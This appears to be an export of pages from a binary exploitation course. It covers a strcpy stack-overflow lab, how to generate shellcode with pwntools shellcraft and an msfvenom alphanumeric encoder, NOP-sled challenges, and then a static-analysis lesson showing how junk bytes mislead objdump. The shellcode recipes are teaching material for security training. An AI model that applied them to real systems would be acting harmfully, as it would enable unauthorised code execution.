&lt;p>The &lt;code>vuln.c&lt;/code> program reads data properly into a buffer, then uses &lt;code>strcpy&lt;/code> to move data into a smaller buffer, resulting in an overflow. Run &lt;code>make&lt;/code>, then the &lt;code>exploit.py&lt;/code> script; just like before, it will start a new terminal window with a &lt;code>gdb&lt;/code> instance in which you can explore what happens. The attack will fail because the injected shellcode contains 0 bytes so &lt;code>strcpy&lt;/code> will only stop copying well before the end of the shellcode.&lt;/p>
&lt;p>Comment line 55 and uncomment line 56, replacing the shellcode with a null-free version. Run &lt;code>exploit.py&lt;/code> again. It should work!&lt;/p>
&lt;h2 id="04-tutorial-shellcodes-in-pwntools">04. Tutorial: shellcodes in pwntools&lt;/h2>
&lt;p>Once again, &lt;code>pwntools&lt;/code> can come to our aid and help us with shellcode attacks. The most useful feature for this is the &lt;a href="https://docs.pwntools.com/en/stable/shellcraft.html">shellcraft module&lt;/a> which offers prebuilt shellcodes for various architectures.&lt;/p>
&lt;p>For example, to obtain a shellcode which performs &lt;code>execve(&amp;quot;/bin/sh&amp;quot;, {&amp;quot;/bin/sh&amp;quot;, NULL}, NULL)&lt;/code> on an &lt;code>x86_64&lt;/code> platform we can call:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">shellcraft&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">amd64&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">linux&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">sh&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Note that this will give you back text representing &lt;em>assembly code&lt;/em> and &lt;strong>not&lt;/strong> &lt;em>machine code&lt;/em> bytes. You can then use the &lt;code>asm&lt;/code> function to assemble it:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">asm&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">shellcraft&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">amd64&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">linux&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">sh&lt;/span>&lt;span style="color:#000;font-weight:bold">(),&lt;/span> &lt;span style="color:#000">arch&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;amd64&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">os&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;linux&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Remember the friendly features of pwntools! Instead of always specifying the OS and the architecture, we can set them in the global context, like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">context&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">arch&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;amd64&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">context&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">os&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;linux&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Or - even simpler - we can indicate a particular binary and let pwntools deduce the OS and architecture: &lt;code>context.binary = &amp;quot;./vuln&amp;quot;&lt;/code>. We can then invoke a much cleaner &lt;code>asm(shellcraft.sh())&lt;/code>.&lt;/p>
&lt;p>Besides the magic snippet to invoke a shell, there are other builtin code fragments, such as to cause a crash, an infinite loop, &lt;code>cat&lt;/code> a file or call some other syscall. Play around with &lt;code>shellcraft&lt;/code>, inspecting the output. You&amp;rsquo;ll notice that all these shellcodes are free of zero bytes and newlines!&lt;/p>
&lt;h2 id="05-tutorial-alphanumeric-shellcode">05. Tutorial: alphanumeric shellcode&lt;/h2>
&lt;p>It is commonly the case that user input is filtered to make sure it matches certain conditions. Most user input expected from a keyboard should not contain non-printable characters; a &amp;ldquo;name&amp;rdquo; should contain only letters, a PIN should contain only digits, etc.&lt;/p>
&lt;p>The program might check its input against some conditions and, if rejected, bail in such a way so as to not trigger our injected code. This places the burden on us to develop shellcode that doesn&amp;rsquo;t contain certain bytes. We&amp;rsquo;ve seen how we can avoid newlines and zero bytes to work around some input-reading functions. This concept can be pushed even further, heavily restricting our character set: on 32-bit platforms, we can write &lt;strong>alphanumeric shellcodes&lt;/strong>!&lt;/p>
&lt;p>But can we really? It&amp;rsquo;s plausible that there are some clever tricks on the level of replacing &lt;code>mov eax, 0x3b&lt;/code> with &lt;code>xor eax, eax; mov al, 0x3b&lt;/code> that could make use of only alphanumeric characters, but all our shellcodes so far need to perform a syscall. Looking at the encoding of the &lt;code>int 0x80&lt;/code> instruction seems pretty grim: &lt;code>\xcd\x80&lt;/code>. Those are not even printable characters. So how can we perform a syscall?&lt;/p>
&lt;p>Here it&amp;rsquo;s important to step back and carefully consider our assumptions:&lt;/p>
&lt;ul>
&lt;li>There is some memory region to which we have both write and execute access (otherwise we wouldn&amp;rsquo;t attempt a code injection attack)&lt;/li>
&lt;li>After our input is read, there is some check on it to make sure it doesn&amp;rsquo;t contain certain characters.&lt;/li>
&lt;/ul>
&lt;p>Aha! We cannot &lt;strong>inject&lt;/strong> some bytes, but nothing&amp;rsquo;s stopping us from injecting something that &lt;strong>generates&lt;/strong> those bytes! Generating is just an alternative way of &lt;em>writing&lt;/em>, so instead of &lt;strong>injecting&lt;/strong> our shellcode, we&amp;rsquo;ll inject some code which &lt;strong>generates&lt;/strong> the shellcode, then executes it!&lt;/p>
&lt;p>This is, in fact, as complicated as it sounds, so we won&amp;rsquo;t do it ourselves. We&amp;rsquo;ll just observe how such a shellcode, produced by a specialized tool (&lt;code>msfvenom&lt;/code>) works. So invoke the following command, which should give you a python-syntax buffer containing an alphanumeric shellcode that executes &amp;ldquo;/bin/sh&amp;rdquo;:&lt;/p>
&lt;p>&lt;code>msfvenom -a x86 --platform linux -p linux/x86/exec -e x86/alpha_mixed BufferRegister=ECX -f python&lt;/code>&lt;/p>
&lt;ul>
&lt;li>&lt;code>-a x86&lt;/code>: specifies the architecture as 32-bit x86&lt;/li>
&lt;li>&lt;code>--platform linux&lt;/code>: specifies OS&lt;/li>
&lt;li>&lt;code>-p linux/x86/exec&lt;/code>: specifies a preset program (you can use &lt;code>-&lt;/code> or &lt;code>STDIN&lt;/code> for a custom initial shellcode, to be transformed)&lt;/li>
&lt;li>&lt;code>-e x86/alpha_mixed&lt;/code>: specifies encoding to be alphanumeric&lt;/li>
&lt;li>&lt;code>BufferRegister=ECX&lt;/code>: specifies an initial register which holds the address of the buffer; this is needed in order to have some way to refer to the region in which we&amp;rsquo;re unpacking our code. Without this, a short non-alphanumeric preamble is added instead to automatically extract the buffer address&lt;/li>
&lt;li>&lt;code>-f python&lt;/code>: formats output using python syntax&lt;/li>
&lt;/ul>
&lt;p>&lt;code>msfvenom&lt;/code> is actually capable of taking an arbitrary assembly snippet and transforming it into an alphanumeric &amp;ldquo;bootstrapper&amp;rdquo; which, once injected, unpacks the original shellcode and executes it.&lt;/p>
&lt;h1 id="challenges">Challenges&lt;/h1>
&lt;h2 id="06-challenge-nop-sled-redo">06. Challenge: NOP sled redo&lt;/h2>
&lt;p>Redo the last three challenges (9, 10, 11) from &lt;a href="../shellcodes">the previous session&lt;/a> using NOP-sleds.&lt;/p>
&lt;h2 id="07-challenge-no-nops-allowed">07. Challenge: No NOPs allowed!&lt;/h2>
&lt;p>This is similar to the previous tasks: you are left to guess a stack address. However, the &lt;code>\x90&lt;/code> byte is filtered from input so you cannot use a NOP sled. But you should be able to adapt the concept. Remember the relevant features of the &amp;ldquo;NOP&amp;rdquo; instruction!&lt;/p>
&lt;h2 id="08-challenge-multiline-output">08. Challenge: multiline output&lt;/h2>
&lt;p>While perfectly ok with the byte 0, some functions (e.g. &lt;code>fgets&lt;/code>) will stop reading when they encounter a newline character (&lt;code>\n&lt;/code>). Thus, if our input is read by such a function, we need to make sure our shellcode contains no &lt;code>\n&lt;/code> bytes.&lt;/p>
&lt;p>For this challenge, the input will be read using the &lt;code>gets&lt;/code> function, but you will need to craft a shellcode which prints to &lt;code>stdout&lt;/code> the exact string:&lt;/p>
&lt;pre tabindex="0">&lt;code>first
second
third
&lt;/code>&lt;/pre>&lt;h2 id="09-challenge-execve-blocking-attempt">09: Challenge: &lt;code>execve&lt;/code> blocking attempt&lt;/h2>
&lt;p>If shellcodes are such a powerful threat, what if we attempted to block some shellcode-sepcific characters? Such as the bytes that encode a &lt;code>syscall&lt;/code> function. Or the slash needed in a path; maybe it&amp;rsquo;s not such a big loss to avoid these in legitimate inputs.&lt;/p>
&lt;p>Can you still get a shell? For this task, &lt;strong>don&amp;rsquo;t use&lt;/strong> an existing encoder, but rather apply the encoding principles yourself.&lt;/p>
&lt;h1 id="further-reading">Further Reading&lt;/h1>
&lt;p>&lt;a href="http://phrack.org/issues/49/14.html">&amp;ldquo;Smashing The Stack For Fun And Profit&amp;rdquo;, Aleph One&lt;/a> - a legendary attack paper documenting SBOs and shellcodes. As it is written in &amp;lsquo;96, the examples in it will probably &lt;em>not&lt;/em> work (either out-of-the-box or with some tweaks). We recommend perusing it for its historical/cultural significance, but don&amp;rsquo;t waste much time on the technical details of the examples.&lt;/p>
&lt;h2 id="input-restrictions">Input restrictions&lt;/h2>
&lt;p>The following articles deal with restrictions on the shellcode structure, such as forbidden characters or statistical properties of the input string. The examples presented will most likely not work as-they-are in a modern environment, so don&amp;rsquo;t focus on the technical details, but rather on the methodology presented.&lt;/p>
&lt;p>&lt;a href="http://phrack.org/issues/57/15.html">&lt;em>Writing ia32 alphanumeric shellcodes&lt;/em>, 2001 - rix&lt;/a> - probably the first comprehensive presentation of how to automatically convert generic shellcodes to alphanumeric ones.&lt;/p>
&lt;p>&lt;a href="http://phrack.org/issues/61/11.html">&lt;em>Building IA32 &amp;lsquo;Unicode-Proof&amp;rsquo; Shellcodes&lt;/em>, 2003 - obscou&lt;/a> - rather than being concerned with input &lt;em>restrictions&lt;/em>, this addresses ulterior transformations on input, namely converting an ASCII string to a UTF-16 one (as mentioned in the article&amp;rsquo;s introduction, you could also imagine other possible transformations, such as case normalization).&lt;/p>
&lt;p>&lt;a href="http://phrack.org/issues/62/9.html">&lt;em>Writing UTF-8 compatible shellcodes&lt;/em>, 2004 - Wana&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.cs.jhu.edu/~sam/ccs243-mason.pdf">&lt;em>English shellcode&lt;/em>, 2009 - Mason, Small, Monrose, MacManus&lt;/a> - delves into automatically generating shellcode which has the same statistical properties as English text.&lt;/p></description></item><item><title>Binary:</title><link>/binary/static-analysis/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/binary/static-analysis/</guid><description>
&lt;h1 id="table-of-contents">Table of Contents&lt;/h1>
&lt;ul>
&lt;li>&lt;a href="#introduction">Introduction&lt;/a>&lt;/li>
&lt;li>&lt;a href="#disassembling-executables">Disassembling executables&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#linear-sweep">Linear Sweep&lt;/a>&lt;/li>
&lt;li>&lt;a href="#recursive-traversal">Recursive Traversal&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#ida-and-ghidra">IDA and Ghidra&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#ida-tips--tricks">IDA tips &amp;amp; tricks&lt;/a>&lt;/li>
&lt;li>&lt;a href="#ida-pro-and-ghidra">IDA Pro and Ghidra&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="#c">C++&lt;/a>&lt;/li>
&lt;li>&lt;a href="#further-reading">Further reading&lt;/a>&lt;/li>
&lt;li>&lt;a href="#challenges">Challenges&lt;/a>
&lt;ul>
&lt;li>&lt;a href="#04-crypto_crackme">04. crypto_crackme&lt;/a>&lt;/li>
&lt;li>&lt;a href="#05-broken">05. broken&lt;/a>&lt;/li>
&lt;li>&lt;a href="#06-hyp3rs3rv3r">06. hyp3rs3rv3r&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h1 id="introduction">Introduction&lt;/h1>
&lt;p>Sometimes we are either unable or reluctant to run an unknown executable. This inability to run the file can be caused by a multitude of factors, such as not having the correct dependencies or runtimes for it. In addition, it is often unsafe to run binaries without analysing them first. Today we&amp;rsquo;ll learn about one method of analysis, called &lt;strong>static analysis&lt;/strong>.&lt;/p>
&lt;p>Thus, static analysis allows us to understand the behaviour of the application by displaying either its assembly code or an equivalent high-level code. In order to obtain the assembly code, via a procedure called &lt;strong>disassembling&lt;/strong>, currently there are two approaches being used, which we&amp;rsquo;ll describe in the following sections. The high-level code, is &lt;em>deduced&lt;/em> from the machine code, through a more complex process called &lt;strong>decompilation&lt;/strong>, which sometimes might make it a bit inaccurate, when compared to the assembly code.&lt;/p>
&lt;h1 id="disassembling-executables">Disassembling executables&lt;/h1>
&lt;p>There are two main strategies when it comes to disassembly. They are called &lt;strong>Linear Sweep&lt;/strong> and &lt;strong>Recursive Traversal&lt;/strong>. As we&amp;rsquo;ll see below, the main difference between the two is their accuracy&lt;/p>
&lt;h2 id="linear-sweep">Linear Sweep&lt;/h2>
&lt;p>The first strategy that we&amp;rsquo;ll look at is &lt;em>Linear Sweep&lt;/em>. A very popular tool that uses this strategy is &lt;code>objdump&lt;/code>. What &lt;em>Linear Sweep&lt;/em> does is it parses the &lt;code>.text&lt;/code> section of the executable from the beginning to the end and translates each encountered machine code instruction into its equivalent Assembly instruction. It&amp;rsquo;s a fast and simple algorithm. Being so simple, however, renders it vulnerable to being mislead. This can happen in a few ways. One way is to insert an inappropriate instruction somewhere in the &lt;code>.text&lt;/code> section. When the algorithm reaches it, it will try to interpret it as something meaningful and output a completely different Assembly code that would make no sense.&lt;/p>
&lt;p>Let&amp;rsquo;s consider the code below, which is also available &lt;a href="https://github.com/hexcellents/sss-exploit/blob/master/sessions/04-static-analysis/activities/01-tutorial-disassemble-methods/src/wrong.c">in this repo&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">int&lt;/span> &lt;span style="color:#000">main&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">asm&lt;/span> &lt;span style="color:#204a87;font-weight:bold">volatile&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#4e9a06">&amp;#34;A: jmp B&lt;/span>&lt;span style="color:#4e9a06">\n\t&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#4e9a06">&amp;#34;.byte 0xde&lt;/span>&lt;span style="color:#4e9a06">\n\t&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#4e9a06">&amp;#34;.byte 0xad&lt;/span>&lt;span style="color:#4e9a06">\n\t&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#4e9a06">&amp;#34;.byte 0xc0&lt;/span>&lt;span style="color:#4e9a06">\n\t&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#4e9a06">&amp;#34;.byte 0xde&lt;/span>&lt;span style="color:#4e9a06">\n\t&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#4e9a06">&amp;#34;jmp -1&lt;/span>&lt;span style="color:#4e9a06">\n\t&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#4e9a06">&amp;#34;B:&lt;/span>&lt;span style="color:#4e9a06">\n\t&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">printf&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;What is wrong with me :-s?&lt;/span>&lt;span style="color:#4e9a06">\n&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">return&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">-&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Take a look at the Makefile rule for &lt;code>wrong&lt;/code> and notice that it &lt;strong>strips&lt;/strong> the binary:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-makefile" data-lang="makefile">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">wrong&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">:&lt;/span> &lt;span style="color:#000">wrong&lt;/span>.&lt;span style="color:#000">o&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>CC&lt;span style="color:#204a87;font-weight:bold">)&lt;/span> &lt;span style="color:#204a87;font-weight:bold">$(&lt;/span>CFLAGS&lt;span style="color:#204a87;font-weight:bold">)&lt;/span> $&amp;lt; -o &lt;span style="color:#000">$@&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> -strip &lt;span style="color:#000">$@&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If we remove the line at the end of the snipped above and then disassemble the executable, we can see our inline assembly code (&lt;code>de ad c0 de&lt;/code>) together with the encoding of &lt;code>jmp -1&lt;/code>. The binary code is as expected, but the way it&amp;rsquo;s interpreted is completely off. This happens because &lt;em>objdump&lt;/em> gets &amp;ldquo;confused&amp;rdquo; when reaching the bytes &lt;code>de ad c0 de&lt;/code> and can&amp;rsquo;t figure out that that code is meaningless.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">080491&lt;/span>&lt;span style="color:#000">ab&lt;/span> &lt;span style="color:#a40000">&amp;lt;&lt;/span>&lt;span style="color:#000">A&lt;/span>&lt;span style="color:#a40000">&amp;gt;&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a40000">80491&lt;/span>&lt;span style="color:#f57900">ab:&lt;/span> &lt;span style="color:#000">eb&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">09&lt;/span> &lt;span style="color:#000">jmp&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">80491b6&lt;/span> &lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#000">B&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a40000">80491&lt;/span>&lt;span style="color:#f57900">ad:&lt;/span> &lt;span style="color:#000">de&lt;/span> &lt;span style="color:#000">ad&lt;/span> &lt;span style="color:#000">c0&lt;/span> &lt;span style="color:#000">de&lt;/span> &lt;span style="color:#000">e9&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">49&lt;/span> &lt;span style="color:#000">fisubr&lt;/span> &lt;span style="color:#000">WORD&lt;/span> &lt;span style="color:#000">PTR&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">ebp&lt;/span>&lt;span style="color:#a40000">+&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x49e9dec0&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a40000">80491&lt;/span>&lt;span style="color:#f57900">b3:&lt;/span> &lt;span style="color:#a40000">6&lt;/span>&lt;span style="color:#000">e&lt;/span> &lt;span style="color:#000">outs&lt;/span> &lt;span style="color:#000">dx&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#000">BYTE&lt;/span> &lt;span style="color:#000">PTR&lt;/span> &lt;span style="color:#000">ds&lt;/span>&lt;span style="color:#000;font-weight:bold">:[&lt;/span>&lt;span style="color:#000">esi&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a40000">80491&lt;/span>&lt;span style="color:#f57900">b4:&lt;/span> &lt;span style="color:#000">fb&lt;/span> &lt;span style="color:#000">sti&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#0000cf;font-weight:bold">80491&lt;/span>&lt;span style="color:#000">b5&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span> &lt;span style="color:#000">f7&lt;/span> &lt;span style="color:#000">.byte&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0xf7&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a40000">080491&lt;/span>&lt;span style="color:#000">b6&lt;/span> &lt;span style="color:#a40000">&amp;lt;&lt;/span>&lt;span style="color:#000">B&lt;/span>&lt;span style="color:#a40000">&amp;gt;&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a40000">80491&lt;/span>&lt;span style="color:#f57900">b6:&lt;/span> &lt;span style="color:#a40000">83&lt;/span> &lt;span style="color:#000">ec&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000">c&lt;/span> &lt;span style="color:#000">sub&lt;/span> &lt;span style="color:#000">esp&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0xc&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If we restore the line where the binary is stripped, recompile and disassemble it once more, we see that this time, &lt;code>objdump&lt;/code> gets completely lost when it encounters our &lt;code>de ad c0 de&lt;/code> sequence. This is because, previously, it used symbols in the binary, such as &lt;code>B&lt;/code>, to figure out where some of the real instructions started. Now, without the help of those symbols, &lt;code>objdump&lt;/code> doesn&amp;rsquo;t manage to output a coherent Assembly code.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a40000">804840&lt;/span>&lt;span style="color:#f57900">c:&lt;/span> &lt;span style="color:#000">eb&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">09&lt;/span> &lt;span style="color:#000">jmp&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">8048417&lt;/span> &lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#000">__libc_start_main@plt&lt;/span>&lt;span style="color:#000;font-weight:bold">+&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x127&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a40000">804840&lt;/span>&lt;span style="color:#f57900">e:&lt;/span> &lt;span style="color:#000">de&lt;/span> &lt;span style="color:#000">ad&lt;/span> &lt;span style="color:#000">c0&lt;/span> &lt;span style="color:#000">de&lt;/span> &lt;span style="color:#000">e9&lt;/span> &lt;span style="color:#000">e8&lt;/span> &lt;span style="color:#000">fisubr&lt;/span> &lt;span style="color:#000">WORD&lt;/span> &lt;span style="color:#000">PTR&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">ebp-0x17162140&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a40000">8048414:&lt;/span> &lt;span style="color:#a40000">7&lt;/span>&lt;span style="color:#000">b&lt;/span> &lt;span style="color:#000">fb&lt;/span> &lt;span style="color:#000">jnp&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">8048411&lt;/span> &lt;span style="color:#000;font-weight:bold">&amp;lt;&lt;/span>&lt;span style="color:#000">__libc_start_main@plt&lt;/span>&lt;span style="color:#000;font-weight:bold">+&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0x121&lt;/span>&lt;span style="color:#000;font-weight:bold">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a40000">8048416:&lt;/span> &lt;span style="color:#000">f7&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">83&lt;/span> &lt;span style="color:#000">ec&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000">c&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">68&lt;/span> &lt;span style="color:#000">c0&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">84&lt;/span> &lt;span style="color:#000">test&lt;/span> &lt;span style="color:#000">DWORD&lt;/span> &lt;span style="color:#000">PTR&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">ebx-0x3f97f314&lt;/span>&lt;span style="color:#000;font-weight:bold">],&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0xe8080484&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a40000">804841&lt;/span>&lt;span style="color:#f57900">d:&lt;/span> &lt;span style="color:#a40000">04&lt;/span> &lt;span style="color:#a40000">08&lt;/span> &lt;span style="color:#000">e8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#0000cf;font-weight:bold">8048420&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span> &lt;span style="color:#000">ac&lt;/span> &lt;span style="color:#000">lods&lt;/span> &lt;span style="color:#000">al&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span>&lt;span style="color:#000">BYTE&lt;/span> &lt;span style="color:#000">PTR&lt;/span> &lt;span style="color:#000">ds&lt;/span>&lt;span style="color:#000;font-weight:bold">:[&lt;/span>&lt;span style="color:#000">esi&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a40000">8048421:&lt;/span> &lt;span style="color:#000">fe&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">bad&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
